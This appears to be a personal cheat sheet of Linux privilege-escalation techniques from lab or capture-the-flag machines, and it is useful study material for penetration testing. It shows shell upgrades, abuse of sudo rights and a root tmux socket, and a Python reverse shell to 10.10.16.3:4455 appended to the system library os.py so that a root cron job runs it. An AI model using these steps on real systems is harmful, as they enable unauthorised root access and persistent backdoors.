# Linux Priv escalation Tips

# ${{\color{purple}Upgrade shell}}\ $

`python -c 'import pty; pty.spawn("/bin/bash")'`

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

# ${{\color{purple}Manual testing}}\ $
# ${{\color{green}sudo -l}}\ $

`sudo -l`

![1](https://user-images.githubusercontent.com/123066149/225001578-46a486b7-bf12-44ef-b52d-1408ef34fb1e.PNG)

`sudo -u scriptmanager /bin/bash`

![image](https://user-images.githubusercontent.com/123066149/225002081-e468220b-fddf-493b-a817-7d64b90accc1.png)

# ${{\color{green}tmux}}\ $

``cat .bash_history``

![image](https://user-images.githubusercontent.com/123066149/226274014-d15271f8-178e-4891-9a3a-7e7fba239035.png)

``ps aux | grep -i tmux``

![image](https://user-images.githubusercontent.com/123066149/226274186-eb4fb8f5-1e4b-4752-ac3d-3fe6e9889d3d.png)

``ls -la /.devs/dev_ses``

![image](https://user-images.githubusercontent.com/123066149/226274516-f2a84f6f-121b-44b6-85c2-84cbb944435a.png)

``export TERM=xterm``
``tmux -S /.devs/dev_sess``

![image](https://user-images.githubusercontent.com/123066149/226274864-b5db7a5e-f19f-4854-929f-aa2f491ae328.png)
![image](https://user-images.githubusercontent.com/123066149/226275042-06bc4a86-474e-486f-a4e4-00ac3e2e4950.png)

# ${{\color{green}crontab + lib os}}\ $

``ls /opt``

![image](https://user-images.githubusercontent.com/123066149/227714929-a9d3bf80-7aed-465e-b1cc-0bdc72116b0a.png)

![image](https://user-images.githubusercontent.com/123066149/227715049-c670f729-a237-4a63-b208-826d06931d66.png)

``cd /usr/lib``

![image](https://user-images.githubusercontent.com/123066149/227715097-471f6bf7-c430-4469-9b17-11bd4a4baaa3.png)

### I added a reverse shell to end of the library ``/usr/lib/python2.7/os.py``

``import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.3",4455))
dup2(s.fileno(),0) 
dup2(s.fileno(),1)
dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")``

![image](https://user-images.githubusercontent.com/123066149/227715198-26be459a-977a-4b3d-bd81-e6e10ee4c6c8.png)

### As soon as the crontab runs I am root :

![image](https://user-images.githubusercontent.com/123066149/227715364-37deff06-5fa2-4b2b-94ef-baf5fddc6deb.png)

# ${{\color{purple}Script}}\ $
# ${{\color{green}LinPeas}}\ $

https://github.com/carlospolop/PEASS-ng/releases/tag/20230319

# ${{\color{green}LinEnum}}\ $

https://github.com/rebootuser/LinEnum

# ${{\color{green}Linux-Exploit-Suggester}}\ $

https://github.com/The-Z-Labs/linux-exploit-suggester

# ${{\color{purple}}}\ $

